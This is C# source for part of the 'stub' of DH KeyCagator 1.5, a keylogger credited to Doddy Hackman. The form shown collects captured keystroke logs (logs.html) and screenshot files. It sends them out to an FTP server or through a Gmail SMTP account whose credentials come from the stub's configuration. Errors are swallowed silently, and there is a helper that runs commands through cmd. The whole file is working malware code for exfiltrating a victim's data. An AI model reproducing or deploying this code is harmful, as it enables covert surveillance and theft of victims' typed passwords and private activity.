// DH KeyCagator 1.5
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Net.Mail;
using Microsoft.Win32;
using System.Diagnostics;

namespace stub
{
    public partial class Form3 : Form
    {

        string op_directorio_especial = "";
        string directorio = "";
        string nombre_carpeta = "";

        string ftp_opcion = "";
        string ftp_opcion_segundos = "";
        string ftp_server = "";
        string ftp_username = "";
        string ftp_password = "";
        string ftp_directorio = "";

        string gmail_sender_op = "";
        string gmail_sender_op_segundos = "";
        string gmail_username = "";
        string gmail_password = "";
        string you_email = "";
        string gmail_only_logs_sender = "";

        string directorio_final = "";

        public Form3()
        {
            InitializeComponent();
        }

        // Functions

        public void cmd_normal(string command)
        {
            System.Diagnostics.Process.Start("cmd", "/c " + command);
        }

        public string basename(string file)
        {
            String nombre = "";

            FileInfo basename = new FileInfo(file);
            nombre = basename.Name;

            return nombre;

        }

        public void FTP_Upload(string servidor, string usuario, string password, string directorio_ftp, string archivo)
        {
            // Based on : http://madskristensen.net/post/simple-ftp-file-upload-in-c-20

            try
            {
                WebClient ftp = new System.Net.WebClient();
                ftp.Credentials = new System.Net.NetworkCredential(usuario, password);

                FileInfo dividir = new FileInfo(archivo);
                string solo_nombre = dividir.Name;

                ftp.UploadFile("ftp://" + servidor + "/" + directorio_ftp + "/" + solo_nombre, "STOR", archivo);
            }
            catch
            {
                //
            }
        }

        public void Gmail_Send()
        {

            // Based on : http://www.codeproject.com/Tips/160326/Using-Gmail-Account-to-Send-Emails-With-Attachment

            try
            {

                MailAddress de = new MailAddress(gmail_username);
                MailAddress a = new MailAddress(you_email);

                MailMessage mensaje = new MailMessage(de, a);

                mensaje.Subject = "LOGS";
                mensaje.Body = "Enjoy the logs";

                if (gmail_only_logs_sender == "1")
                {
                    Attachment archivo = new Attachment(directorio_final + "logs.html");
                    archivo.Name = "logs.html";
                    mensaje.Attachments.Add(archivo);
                }
                else
                {
                    List<String> logs_found = recoger_logs();
                    foreach (string log in logs_found)
                    {
                        Attachment archivo = new Attachment(log);
                        archivo.Name = basename(log);
                        mensaje.Attachments.Add(archivo);
                    }
                }

                SmtpClient gmailsender = new SmtpClient("smtp.gmail.com", 587);

                gmailsender.UseDefaultCredentials = false;
                gmailsender.EnableSsl = true;
                gmailsender.Credentials = new NetworkCredential(gmail_username, gmail_password);

                gmailsender.Send(mensaje);

            }

            catch
            {
                //
            }

        }

        public List<String> recoger_logs()
        {
            List<string> archivos_a_enviar = new List<string>();

            if (File.Exists(directorio_final + "logs.html"))
            {
                archivos_a_enviar.Add(directorio_final + "logs.html");
            }

            DirectoryInfo cargando_directorio = new DirectoryInfo(directorio_final);
            foreach (FileInfo archivo in cargando_directorio.GetFiles())
            {
                if (Path.GetExtension(archivo.Name) == ".jpg")
                {
                    archivos_a_enviar.Add(directorio_final + "/" + archivo.Name);
                }
            }
            return archivos_a_enviar;
        }

        public void enviar_logs_ftp(string host, string username, string password, string directorio)
        {
            List<String> logs_found = recoger_logs();

            foreach (string log in logs_found)
            {
                FTP_Upload(ftp_server, ftp_username, ftp_password, ftp_directorio, log);
            }
        }

        //

        private void mephobiaButton1_Click(object sender, EventArgs e)
        {
            Form3.ActiveForm.Hide();
        }

        private void mephobiaButton3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form3_Load(object sender, EventArgs e)
        {
            load_config config = new load_config();
            config.load_data();
            //MessageBox.Show(config.get_data());

            op_directorio_especial = config.opcion_directorio_especial;
            directorio = config.directorio_normal;
            nombre_carpeta = config.carpeta;

            if (config.opcion_directorio_especial == "0")
            {
                directorio_final = directorio + nombre_carpeta + "/";
            }
            else
            {
                directorio_final = Environment.GetEnvironmentVariable(directorio) + nombre_carpeta + "/";
            }

            ftp_opcion = config.opcion_ftp_sender;
            if (config.tiempo_ftp_sender != "")
            {
                ftp_opcion_segundos = Convert.ToString(Convert.ToInt16(config.tiempo_ftp_sender) * 1000); //
            }
            ftp_server = config.ftp_host;
            ftp_username = config.ftp_user;
            ftp_password = config.ftp_pass;
            ftp_directorio = config.ftp_path;

            gmail_sender_op = config.opcion_sender_mail;
            if (config.tiempo_sender_mail != "")
            {
                gmail_sender_op_segundos = Convert.ToString(Convert.ToInt16(config.tiempo_sender_mail) * 1000); //
            }
            gmail_username = config.mail_user;
            gmail_password = config.mail_pass;
            you_email = config.mail_to;
            gmail_only_logs_sender = config.opcion_sender_mail_only;

            Directory.SetCurrentDirectory(directorio_final);

            richTextBox1.Clear();
            richTextBox1.AppendText(config.get_data());

        }

        private void mephobiaButton8_Click(object sender, EventArgs e)
        {
            enviar_logs_ftp(ftp_server, ftp_username, ftp_password, ftp_directorio);
            MessageBox.Show("Logs sent");
        }

        private void mephobiaButton9_Click(object sender, EventArgs e)
        {
            Gmail_Send();
            MessageBox.Show("Logs sent");
        }

        private void mephobiaButton10_Click(object sender, EventArgs e)
        {
            cmd_normal("\"" + directorio_final + "/" + "logs.html" + "\"");
        }

    }
}

// The End ?